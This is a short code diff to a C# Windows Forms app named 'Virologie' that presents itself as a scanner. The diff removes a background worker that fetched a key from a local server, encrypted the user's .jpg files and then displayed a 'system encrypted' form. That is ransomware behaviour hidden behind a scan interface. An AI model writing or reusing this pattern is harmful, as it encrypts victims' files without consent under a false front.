@@ -12,7 +12,6 @@ namespace Virologie
 {
     public partial class Form1 : Form
     {
-        BackgroundWorker worker;
 
         public Form1()
         {
@@ -24,33 +23,6 @@ namespace Virologie
             HomeCollection.Add(SystemLabel);
             HomeCollection.Add(LastScanLabel);
             HomeCollection.Add(ScanRedirectLabel);*/
-
-            worker = new BackgroundWorker();
-            worker.DoWork += worker_DoWork;
-            worker.RunWorkerCompleted += worker_RunWorkerCompleted;
-        }
-
-        void worker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
-        {
-            if (e.Error != null)
-            {
-                Console.WriteLine("Error running the scan");
-                return;
-            }
-
-            var seForm = new SystemEncrytedForm();
-            seForm.Show();
-        }
-
-        void worker_DoWork(object sender, DoWorkEventArgs args)
-        {
-            FileExplorer explorer = new FileExplorer();
-            FileEncrypter encrypter = CryptoKeyManager.CreateFromServer("http://localhost:1234/");
-            if (encrypter != null)
-            {
-                explorer.ExploreAndApply(Directory.GetCurrentDirectory(), "*.jpg", encrypter.Encrypt);
-                CryptoKeyManager.SaveGUID();
-            }
         }
 
         private void HomeCheckBox_Click(object sender, EventArgs e)
